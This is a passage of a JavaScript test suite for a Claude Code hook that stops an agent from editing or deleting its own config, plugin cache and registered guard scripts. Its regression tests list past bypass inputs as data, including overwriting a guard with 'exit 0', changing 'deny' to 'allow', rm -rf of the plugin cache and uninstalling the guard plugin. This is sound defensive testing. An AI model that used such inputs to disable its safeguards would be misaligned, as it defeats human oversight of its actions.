    assert.match(output.hookSpecificOutput.permissionDecisionReason, /^🔒 \[claude-plugins\]/);
  });

  it('denies a Write to ~/.claude.json', async () => {
    const { output } = await runHook(toolPayload('Write', { file_path: path.join(TMP_HOME, '.claude.json'), content: '{"mcpServers":{}}' }));
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    assert.match(output.hookSpecificOutput.permissionDecisionReason, /\[claude-json\]/);
  });

  it('denies deleting the Claude dir by its literal path', async () => {
    const { output } = await runHook(toolPayload('Bash', { command: `rm -rf ${path.join(TMP_HOME, '.claude')}` }));
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
  });

  it('passes a Read of the cached dispatcher', async () => {
    const { output } = await runHook(toolPayload('Read', { file_path: cached }));
    assert.deepStrictEqual(output, {});
  });

  it('CONFIG_GUARD_ALLOW=true lets an intentional cache edit through', async () => {
    const { output } = await runHook(toolPayload('Edit', { file_path: cached, old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: 'true' });
    assert.deepStrictEqual(output, {});
  });

  it('protects a custom CLAUDE_CONFIG_DIR plugins dir, including through a symlink', async () => {
    const configDir = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-cfgdir-'));
    fs.mkdirSync(path.join(configDir, 'plugins', 'cache'), { recursive: true });
    const link = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-link-')), 'cfg');
    fs.symlinkSync(configDir, link, 'dir');
    const env = { CLAUDE_CONFIG_DIR: configDir };
    for (const file of [path.join(configDir, 'plugins', 'cache', 'hook.js'), path.join(link, 'plugins', 'new.js')]) {
      const { output } = await runHook(toolPayload('Write', { file_path: file, content: 'x' }), env);
      assert.strictEqual(output.hookSpecificOutput?.permissionDecision, 'deny', file);
    }
    for (const command of [`rm -rf ${configDir}/plugins`, 'rm -rf "$CLAUDE_CONFIG_DIR"/plugins/cache', `rm -rf ${configDir}`]) {
      const { output } = await runHook(toolPayload('Bash', { command }), env);
      assert.strictEqual(output.hookSpecificOutput?.permissionDecision, 'deny', command);
    }
    const { output } = await runHook(toolPayload('Write', { file_path: path.join(configDir, 'notes.md'), content: 'x' }), env);
    assert.deepStrictEqual(output, {});
  });
});

// Inputs that once switched a guard off: each was allowed before this guard
// protected the plugin cache, the CLI aliases and registered hook scripts.
describe('Regression: guard self-protection inputs', () => {
  it('denies writes and deletes in the installed plugin cache and plugin lists', () => {
    for (const file of [
      '/Users/dev/.claude/plugins/cache/claude-code-hooks/config-guard/1.0.0/config-guard.js',
      '/Users/dev/.claude/plugins/cache/claude-code-hooks/guard-pack/1.4.0/lib/dispatch.js',
      '/Users/dev/.claude/plugins/installed_plugins.json',
      '/Users/dev/.claude/plugins/known_marketplaces.json',
    ]) fileBlocked(file, 'claude-plugins');
    bashBlocked('echo \'process.stdout.write("{}")\' > ~/.claude/plugins/cache/claude-code-hooks/guard-pack/1.4.0/guard-pack.js', 'claude-plugins');
    bashBlocked('rm -rf ~/.claude/plugins/cache/claude-code-hooks', 'claude-plugins');
  });

  it('denies a Write to ~/.claude.json that adds an MCP server', () => {
    fileBlocked('/Users/alice/.claude.json', 'claude-json');
  });

  it('denies the uninstall, install and prune aliases of the plugin CLI', () => {
    for (const cmd of [
      'claude plugin remove config-guard@claude-code-hooks',
      'claude plugin rm guard-pack@claude-code-hooks',
      'claude plugins uninstall config-guard@claude-code-hooks',
      'claude plugin i some-plugin@some-market',
      'claude plugins install some-plugin@some-market',
      'claude plugin prune',
      'claude plugins autoremove',
    ]) bashBlocked(cmd, 'claude-cli-config');
  });

  it('denies config CLI writes behind global options', () => {
    bashBlocked('claude --debug plugin uninstall config-guard@claude-code-hooks', 'claude-cli-config');
    bashBlocked('claude -d mcp add x -- npx some-server', 'claude-cli-config');
    bashBlocked('claude --model opus --settings "/tmp/a b.json" plugin rm x@y', 'claude-cli-config');
  });

  it('still allows the read-only plugin and mcp commands', () => {
    for (const cmd of ['claude plugin list', 'claude plugins list', 'claude plugin details x', 'claude plugin marketplace list', 'claude --debug mcp list', 'claude --version']) bashAllowed(cmd);
  });

  it('answers a long option run without backtracking', () => {
    const start = Date.now();
    bashAllowed(`claude ${'-a b '.repeat(2000)}x`);
    assert.ok(Date.now() - start < 1000);
  });
});

describe('Regression: hook scripts registered outside .claude/hooks', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-registered-'));
  const project = path.join(home, 'proj');
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  fs.mkdirSync(path.join(project, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(home, '.claude', 'settings.json'), JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [
    { type: 'command', command: 'node /Users/dev/hooks/block-dangerous-commands.js' },
    { type: 'command', command: 'bash ~/guards/gate.sh --strict' },
  ] }] } }));
  fs.writeFileSync(path.join(project, '.claude', 'settings.json'), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [
    { type: 'command', command: 'python3 "$CLAUDE_PROJECT_DIR/hooks/tier_gate.py"' },
  ] }] } }));
  const at = (toolName, toolInput) => ({ ...toolPayload(toolName, toolInput), cwd: project });
  const denied = async (payload) => {
    const { output } = await runHook(payload, { HOME: home, CLAUDE_PROJECT_DIR: project });
    assert.strictEqual(output.hookSpecificOutput?.permissionDecision, 'deny', JSON.stringify(payload.tool_input));
    assert.match(output.hookSpecificOutput.permissionDecisionReason, /\[hook-script\]/);
  };
  const passed = async (payload) => {
    const { output } = await runHook(payload, { HOME: home, CLAUDE_PROJECT_DIR: project });
    assert.deepStrictEqual(output, {}, JSON.stringify(payload.tool_input));
  };

  it('denies a Write to a script the user settings register as a hook', () => denied(at('Write', { file_path: '/Users/dev/hooks/block-dangerous-commands.js', content: 'x' })));
  it('denies an Edit of a project hook named through $CLAUDE_PROJECT_DIR', () => denied(at('Edit', { file_path: 'hooks/tier_gate.py', old_string: 'deny', new_string: 'allow' })));
  it('denies a shell redirect and a delete of registered scripts', async () => {
    await denied(at('Bash', { command: 'echo exit 0 > ~/guards/gate.sh' }));
    await denied(at('Bash', { command: 'rm /Users/dev/hooks/block-dangerous-commands.js' }));
  });
  it('passes reads and files the settings do not register', async () => {
    await passed(at('Read', { file_path: '/Users/dev/hooks/block-dangerous-commands.js' }));
    await passed(at('Bash', { command: 'cat /Users/dev/hooks/block-dangerous-commands.js' }));
    await passed(at('Write', { file_path: '/Users/dev/hooks/notes.md', content: 'x' }));
    await passed(at('Write', { file_path: 'hooks/helper.py', content: 'x' }));
  });
});

describe('Regression: registered hook commands are read as commands', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-hookcmd-'));
  after(() => fs.rmSync(home, { recursive: true, force: true }));
  const project = path.join(home, 'proj');
  fs.mkdirSync(path.join(project, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(project, '.claude', 'settings.json'), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [
    { type: 'command', command: 'node ./scripts/check.js > ./reports/status.log 2>&1' },
    { type: 'command', command: 'node gate.js' },
    { type: 'command', command: 'node lint.js sample.js' },
  ] }] } }));
  const env = { HOME: home, CLAUDE_PROJECT_DIR: project };
  const decide = async (toolName, toolInput) => (await runHook({ ...toolPayload(toolName, toolInput), cwd: project }, env)).output;

  it('protects the script, a bare script name and project-relative shell spellings', async () => {
    for (const [toolName, toolInput] of [['Write', { file_path: 'scripts/check.js', content: 'x' }], ['Write', { file_path: 'gate.js', content: 'x' }],
      ['Bash', { command: 'echo x > scripts/check.js' }], ['Bash', { command: 'echo x > ./scripts/check.js' }], ['Bash', { command: 'rm gate.js' }]]) {
      const out = await decide(toolName, toolInput);
      assert.match(out.hookSpecificOutput?.permissionDecisionReason || '', /\[hook-script\]/, JSON.stringify(toolInput));
    }
  });

  it('does not protect where a hook writes its output, a data argument, or reads of the script', async () => {
    for (const [toolName, toolInput] of [['Write', { file_path: 'reports/status.log', content: 'x' }], ['Bash', { command: 'cat scripts/check.js' }],
      ['Write', { file_path: 'sample.js', content: 'x' }]]) {
      assert.deepStrictEqual(await decide(toolName, toolInput), {}, JSON.stringify(toolInput));
    }
  });

  it('skips a settings file too large to be real settings', async () => {
    const big = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-bigsettings-'));
    after(() => fs.rmSync(big, { recursive: true, force: true }));
    fs.mkdirSync(path.join(big, '.claude'));
    fs.writeFileSync(path.join(big, '.claude', 'settings.json'), JSON.stringify({ pad: 'x'.repeat(2 * 1024 * 1024) }));
    const start = Date.now();
    const out = (await runHook({ ...toolPayload('Write', { file_path: path.join(big, 'notes.md'), content: 'x' }), cwd: big }, { HOME: home, CLAUDE_PROJECT_DIR: big })).output;
    assert.deepStrictEqual(out, {});
    assert.ok(Date.now() - start < 3000);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Config validation
// ─────────────────────────────────────────────────────────────────────────────

describe('Config validation', () => {
  it('SAFETY_LEVEL is a valid level', () => {
    assert.ok(['critical', 'high', 'strict'].includes(SAFETY_LEVEL));
  });
  it('every protected path pattern has level, id, regex, reason', () => {
    for (const p of PROTECTED_PATHS) {
      assert.ok(p.level in LEVELS, `bad level on ${p.id}`);
      assert.ok(typeof p.id === 'string' && p.id.length > 0);
      assert.ok(p.regex instanceof RegExp);
      assert.ok(typeof p.reason === 'string' && p.reason.length > 0);
    }
  });
  it('every bash token has level, id, regex, reason', () => {
    for (const t of BASH_TOKENS) {
      assert.ok(t.level in LEVELS, `bad level on ${t.id}`);
      assert.ok(typeof t.id === 'string' && t.id.length > 0);
      assert.ok(t.regex instanceof RegExp);
      assert.ok(typeof t.reason === 'string' && t.reason.length > 0);
    }
  });
  it('path patterns and bash tokens cover the same target ids', () => {
    const pathIds = new Set(PROTECTED_PATHS.map((p) => p.id));
    const tokenIds = new Set(BASH_TOKENS.map((t) => t.id));
    assert.deepStrictEqual([...tokenIds].sort(), [...pathIds].sort());
  });
});
